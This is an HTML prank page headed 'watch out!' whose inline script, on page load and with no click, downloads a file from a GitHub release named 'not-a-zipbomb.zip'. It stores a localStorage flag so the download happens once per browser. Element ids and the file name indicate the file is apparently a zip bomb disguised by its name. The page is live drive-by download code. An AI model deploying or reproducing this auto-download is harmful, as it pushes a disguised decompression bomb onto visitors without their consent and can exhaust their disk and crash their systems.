<!DOCTYPE html>
<html>
    <head>
        <title>watch out!</title>
        <style>
            @font-face {
                font-family: "Renogare";
                src: url("Renogare.ttf");
            }

            html, body {
                margin: 0;
                height: 100%;
                overflow: hidden;
            }

            body {
                background-color: rgb(35, 35, 35);
                font-family: "Renogare", monospace;
            }

            .container {
                position: absolute;
                width: 100%;
                height: 100%;
                display: grid;
                place-items: center;
            }

            div {
                pointer-events: none;
            }

            nothingtoseehere {
                display: none;
            }

            #input {
                top: 10%;
            }

            input {
                text-align: center;
                pointer-events: all;
            }

            img {
                pointer-events: all;
            }

            #its-a-zipbomb:hover {
                cursor: pointer;
            }

            #fader {
                width: 100%;
                height: 100%;
                position: absolute;
                background-color: red;
                opacity: 0;
            }
        </style>
    </head>
    <body>
        <div class="container" id="grid">
            <img id="its-a-zipbomb" src="zipbomb.png">
        </div>
        <div class="container" id="input">
            <input type="text", id="text">
        </div>

        <div id="fader"></div>
        
        <script src="shrimp.js"></script>
        <script>
            window.addEventListener("DOMContentLoaded", (e) => {
                if (localStorage.getItem("do-not-download") == "true") return;

                let download = document.createElement("a");
                download.href = "https://github.com/ZiggySaidGrub/sink/releases/download/mrrow/not-a-zipbomb.zip";
                download.download = "not-a-zipbomb.zip";
                document.body.appendChild(download);
                download.click();
                document.body.removeChild(download);

                localStorage.setItem("do-not-download", "true");
            });
        </script>
    </body>
</html>
